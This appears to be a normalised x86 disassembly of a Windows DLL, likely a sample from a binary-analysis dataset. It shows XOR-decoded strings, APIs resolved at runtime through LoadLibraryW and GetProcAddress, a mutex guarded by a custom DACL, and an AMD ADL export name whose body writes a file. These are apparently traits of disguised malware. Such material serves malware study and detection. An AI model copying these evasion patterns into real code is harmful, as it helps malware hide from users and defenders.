cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_1000c927
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_100263f7
pop ecx
sub_1000c950
push ebp
mov ebp esp
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xd4 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffda
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x36 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xd0 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x48 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xd0 ]
jns r-xdata
lea edx [ ebp - 0xc4 ]
mov [ ebp - 0xc4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x44
call sub_1002f620
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x32
call sub_1002f620
mov eax 0x1
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x56
call sub_1002f620
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x7f
jmp r-xdata
call sub_1002f620
lea edx [ ebp - 0x34 ]
mov eax 0x74
call sub_1002f620
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xc4 ]
push eax
push ebx
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x35
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc4 ] 0x0
mov edx [ edi + 0x18 ]
lea ecx [ ebp - 0xcc ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xcc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x4e
jmp r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x63
call sub_1002f620
mov esi [ ebp - 0xcc ]
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
push ebx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xcc ] eax
mov edx [ ebp - 0xcc ]
push edx
call [ SysFreeString@IAT ]
fld [ edi + 0x10 ]
lea eax [ ebp - 0xc8 ]
push eax
push 0x0
push 0x80000000
sub esp 0x8
fstp [ esp ]
mov [ ebp - 0xc8 ] 0x0
call [ VarBstrFromR8@IAT ]
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x12f
call sub_1002f620
lea edx [ ebp - 0x58 ]
mov eax 0x96
call sub_1002f620
mov esi [ ebp - 0xc8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc4 ]
push edx
push ebx
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xd8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx [ ebp - 0xd0 ]
push ecx
push eax
call edx
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x55
call sub_1002f620
lea edx [ ebp - 0xac ]
mov eax 0xe7
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xd4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc4 ]
test eax eax
je r-xdata
sub_1000cc80
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff89
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbf
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x6
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x24 ] ax
call esi
lea edx [ ebp - 0x20 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f580
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f580
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x20 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f580
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f580
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x30 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f580
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000ce20
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1000ce60
push ebp
mov ebp esp
push 0xffffffff
push sub_10088508
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
cmp [ eax + 0x1c ] ebx
jne r-xdata
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_100609f0
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x8
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
jmp r-xdata
mov edi [ ebp - 0x1c ]
cmp ecx 0x8
lea eax [ eax + edi * 2 ]
mov ecx edx
jae r-xdata
lea eax [ ebp - 0x2c ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x30 ]
push edx
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_1004f5e0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
sub_1000cf23
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_10032181
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea ecx [ ebp + 0xc ]
call sub_1000eff4
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1003a496
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1000cffb
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_1000d019
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10051cf5
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100495e4
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100090d0
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1000d0d0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x34 ] eax
add eax 0x1c
push eax
push r--data
push 0x1
push 0x0
push r--data
mov ebx edx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
push esi
push edi
push r--data
mov [ ebp - 0x28 ] 0x1
xor edi edi
call [ lstrlenA@IAT ]
mov ecx r--data
mov esi ebx
cmp eax 0x4
jb r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push r--data
mov [ ecx + 0x140 ] 0x1
call [ lstrlenA@IAT ]
mov edi eax
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
push eax
add ebx edi
push ebx
call [ SysAllocStringByteLen@IAT ]
mov edx [ ebp - 0x30 ]
mov esi eax
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push esi
push eax
mov eax [ ecx + 0x104 ]
call eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
push esi
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp eax 0x1
jbe r-xdata
inc eax
cmp eax 0xf
jb r-xdata
push esi
call [ SysFreeString@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
ADL2_Overdrive5_PowerControlAbsValue_Caps
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push 0x104
lea edx [ ebp - 0x108 ]
push edx
push eax
call [ WriteFile@IAT ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
lea eax [ eax + eax * 2 - 0xf ]
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000d280
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x100
cmp eax ebx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
call [ GetProcessHeap@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea edx [ ebp - 0x10 ]
push edx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x14 ]
push edx
push 0x1
mov [ ebp - 0x4c ] 0x1f0001
mov [ ebp - 0x48 ] 0x2
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] 0x5
mov [ ebp - 0x30 ] eax
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ FreeSid@IAT ]
push 0x14
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x1
push esi
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push edi
mov eax [ ebp - 0x1c ]
push ebx
push eax
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
xor eax eax
push edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
push ebx
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
call [ CreateMutexW@IAT ]
push esi
push ebx
mov [ ebp - 0x18 ] eax
push edi
cmp eax ebx
je r-xdata
push esi
push ebx
push edi
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ FreeSid@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
push edx
call [ CloseHandle@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000d483
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100579de
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_100579de
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1000d540
push ebp
mov ebp esp
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xe4 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xe0 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xe0 ]
push ebx
mov ebx [ ebp - 0xe4 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10048ec0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xec ] 0x0
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x22
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x48 ]
xor eax eax
push ecx
mov [ ebp - 0x32 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xc0 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0xd7
inc dl
mov [ ebp + ecx - 0x10 ] bl
movzx ecx dl
cmp ecx 0xb
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ ebp - 0x5 ] 0x0
call ebx
mov [ esi + 0xc4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x5c ]
mov eax 0x49
call sub_10018dc0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xc4 ]
mov eax 0x4
call sub_10018dc0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x20 ]
mov eax 0x16
call sub_10018dc0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x70 ]
mov eax 0x24
call sub_10018dc0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xac ]
mov eax 0x3a
call sub_10018dc0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov eax 0x3e
call sub_10018dc0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x5c
call sub_10018dc0
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x84 ]
mov eax 0x19
call sub_10018dc0
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0x43
call sub_10018dc0
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe8 ] eax
test eax eax
je r-xdata
mov [ esi + 0xec ] 0x1
sub_1000d7b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b00
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x71c71c7
jbe r-xdata
mov ecx edi
call sub_1006d880
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_10057da0
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_10030594
sub_1000d880
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi ecx
call sub_1003c1d0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] ebx
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
push ebx
push 0x8
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
xor ecx ecx
cmp eax edi
setne cl
push ebx
push edx
push eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x8 ] ecx
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000d920
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
push 0x4
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov [ edi + 0x14 ] eax
push esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x1c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x24 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x2c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x34 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x38 ] esi
mov [ edi + 0x3c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
dec [ ebx ]
jne r-xdata
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
